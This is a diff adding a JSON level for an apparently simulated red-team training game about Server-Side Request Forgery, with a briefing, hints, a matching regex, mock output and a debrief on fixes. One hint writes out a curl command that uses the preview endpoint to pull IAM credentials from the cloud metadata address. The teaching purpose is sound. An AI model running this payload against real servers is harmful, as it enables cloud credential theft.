@@ -1,0 +1,48 @@
+{
+  "id": "red-10-ssrf",
+  "role": "red",
+  "order": 10,
+  "owasp_category": "A10:2021 - Server-Side Request Forgery (SSRF)",
+  "title": "Steal Cloud Credentials via the Preview Fetcher",
+  "difficulty": 10,
+  "objective": "Abuse the image-preview URL fetcher to reach the internal cloud metadata service and steal credentials.",
+  "briefing": "The app has a preview feature at http://{ip}/api/preview?url=... that fetches any URL server-side and returns its content. There's no restriction on which addresses it's allowed to reach.",
+  "hints": [
+    "The fetcher will request literally any URL you give it - including addresses that only the server itself could normally reach.",
+    "Cloud servers often expose their own instance credentials at a special internal-only address.",
+    "curl \"http://{ip}/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\""
+  ],
+  "debrief": "The preview feature fetches whatever URL is supplied, from the server itself - so pointing it at the cloud metadata address (169.254.169.254) made the server, which does have access to that internal-only endpoint, fetch and return its own IAM credentials to you. This is Server-Side Request Forgery (OWASP A10:2021): a server-side feature that fetches user-supplied URLs becomes a proxy an attacker can use to reach internal-only services the attacker could never address directly. The fix is an allowlist of permitted destinations/schemes, blocking requests to internal/link-local IP ranges, and using a metadata service version that requires a request-bound token (like IMDSv2) so a bare GET isn't enough even if SSRF occurs.",
+  "victim_pc_initial_state": {
+    "files": ["/var/www/api/preview.php"],
+    "services": ["apache2"],
+    "logs": ["[BOOT] apache2 started"]
+  },
+  "commands": {},
+  "command_patterns": [
+    {
+      "regex": "curl \"http://{ip}/api/preview\\?url=(?P<target>[^\"]*)\"",
+      "cases": [
+        {
+          "checks": [
+            { "name": "regex", "args": { "field": "target", "pattern": "^https?://169\\.254\\.169\\.254(/|$)" } }
+          ],
+          "output": "HTTP/1.1 200 OK\n{\"AccessKeyId\":\"AKIAEXAMPLE\",\"SecretAccessKey\":\"redacted\"}",
+          "state_change": {
+            "logs_append": ["[SSRF] preview endpoint used to reach internal metadata service - credentials exposed"]
+          },
+          "wins_level": true
+        },
+        {
+          "output": "HTTP/1.1 200 OK\nfetched external page (12KB)",
+          "state_change": {
+            "logs_append": ["[ACCESS] preview fetched {target}"]
+          },
+          "wins_level": false
+        }
+      ]
+    }
+  ],
+  "randomizable_fields": ["ip"],
+  "default_values": { "ip": "10.0.0.5" }
+}
